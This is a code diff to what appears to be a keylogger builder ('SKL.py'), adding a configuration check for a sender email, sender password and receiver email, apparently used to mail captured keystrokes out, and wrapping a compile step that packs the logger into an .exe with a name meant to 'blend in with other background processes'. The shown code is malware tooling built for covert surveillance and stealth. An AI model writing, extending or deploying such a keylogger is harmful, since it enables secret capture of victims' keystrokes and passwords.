@@ -301,6 +301,33 @@ def START_LOGGER():
 
 
 
+#!# -----------------------------------CONFIG RELATED----------------------------------- #!#
+
+def check_config():
+    try:
+        with open(f"{JsonPath}") as f:
+            data = json.load(f)
+            try:
+                senderEmail = data["sender_email"]
+                senderPassword = data["sender_password"]
+                receiver_email = data["receiver_email"]
+            except:
+                print(bcolors.FAIL + "Your configuration (emails/password) arent setup correctly.\nplease use \"config\" to set them up")
+                return False
+            try:
+                mode = data["mode"]
+                             
+            except:
+                print(bcolors.FAIL + "Your mode configuration is not setup properly.\nplease use \"mode\" to set it up")
+               
+                return False
+    except Exception as e:
+         print(bcolors.FAIL + "Critical error. Major file is missing from your computer.")
+         print(e)
+         return False
+    return True
+
+
 
 #!# -----------------------------------CONTROL PANEL----------------------------------- #!#
 
@@ -352,15 +379,19 @@ def __main__():
 
     elif CONSOLE.lower() == "compile":
         try:
-            print(bcolors.WARNING + "Please enter a name for your .exe file." + bcolors.DIM + "\nMake sure it blends in with other background processes (do not use spaces)." + bcolors.RESET_DIM)
-            filename = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
-            os.system("cls")
-            printlogo()
-            print(bcolors.WARNING + "Enter the file path of a logo" + bcolors.DIM + "\nIf you dont have a logo, just type NONE." + bcolors.RESET_DIM)
-            logo = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
-            os.rename("SKL.py", filename + ".py")
-            os.system(f"pyinstaller -F  \"{filename}\".py -i {logo}")
-            os.rename(f"{filename}.py", "SKL.py")
+            
+            if check_config() == False:
+                pass
+            else:    
+                print(bcolors.WARNING + "Please enter a name for your .exe file." + bcolors.DIM + "\nMake sure it blends in with other background processes (do not use spaces)." + bcolors.RESET_DIM)
+                filename = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
+                os.system("cls")
+                printlogo()
+                print(bcolors.WARNING + "Enter the file path of a logo" + bcolors.DIM + "\nIf you dont have a logo, just type NONE." + bcolors.RESET_DIM)
+                logo = input(bcolors.OKBLUE + "filename: " + bcolors.WHITE)
+                os.rename("SKL.py", filename + ".py")
+                os.system(f"pyinstaller -F  \"{filename}\".py -i {logo}")
+                os.rename(f"{filename}.py", "SKL.py")
         except:
             print(bcolors.FAIL + "Failed to compile KeyLogger properly.")
     elif CONSOLE.lower() == "test":
